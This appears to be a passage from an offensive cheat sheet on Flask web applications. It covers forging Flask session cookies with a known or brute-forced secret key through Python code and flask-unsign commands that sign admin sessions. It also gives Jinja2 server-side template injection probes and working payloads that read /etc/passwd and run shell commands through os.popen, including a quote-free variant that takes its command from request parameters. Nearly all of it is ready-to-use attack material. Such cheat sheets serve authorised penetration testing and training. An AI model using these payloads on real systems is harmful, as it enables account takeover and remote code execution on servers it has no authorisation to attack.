<session_forgery>
{% raw %}
# Session cookie manipulation:

# Flask session cookie format:
# base64(payload).timestamp.signature

# Decode session:
import base64
import zlib

cookie = "eyJ..." 
data = base64.urlsafe_b64decode(cookie.split('.')[0] + '==')
# May be zlib compressed

# If SECRET_KEY known:
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'known_key'
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(app)

# Decode:
data = serializer.loads(cookie)

# Forge:
new_session = {'user_id': 1, 'is_admin': True}
forged_cookie = serializer.dumps(new_session)

# Flask-Unsign tool:
flask-unsign --decode --cookie 'cookie_value'
flask-unsign --sign --cookie "{'admin': True}" --secret 'key'
flask-unsign --unsign --cookie 'cookie_value' --wordlist wordlist.txt
{% endraw %}
</session_forgery>
</secret_key>

<jinja2_ssti>
<ssti_detection>
{% raw %}
# Jinja2 SSTI detection:

# Basic detection:
{{7*7}}  # Returns 49
{{7*'7'}}  # Returns 7777777
${7*7}  # Alternative syntax

# Confirm Jinja2:
{{config}}
{{config.items()}}
{{self}}
{{request}}

# Error-based detection:
{{invalid}}
{{''.__class__}}

# Context exploration:
{{request.environ}}
{{request.headers}}
{{request.cookies}}
{% endraw %}
</ssti_detection>

<ssti_exploitation>
{% raw %}
# Jinja2 SSTI RCE:

# Python 2:
{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}

# Python 3 - find useful classes:
{% for c in ''.__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
{% endif %}
{% endfor %}

# Shorter payloads:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Without quotes:
{{lipsum.__globals__[request.args.x].popen(request.args.y).read()}}&x=os&y=id

